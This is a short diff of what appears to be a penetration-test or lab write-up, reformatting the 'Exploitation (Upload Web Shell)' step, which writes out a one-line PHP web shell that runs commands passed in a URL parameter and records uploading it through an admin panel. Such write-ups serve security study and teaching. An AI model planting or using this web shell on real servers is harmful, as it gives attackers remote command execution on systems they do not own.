@@ -35,7 +35,7 @@ I found file upload functionality
 Step 5: Exploitation (Upload Web Shell)
 
 Created a web shell:
-echo '<?php system($_GET["cmd"]); ?>'> cmd.php
+`echo '<?php system($_GET["cmd"]); ?>' > cmd.php`
 
 Uploaded cmd.php via the admin panel.
 
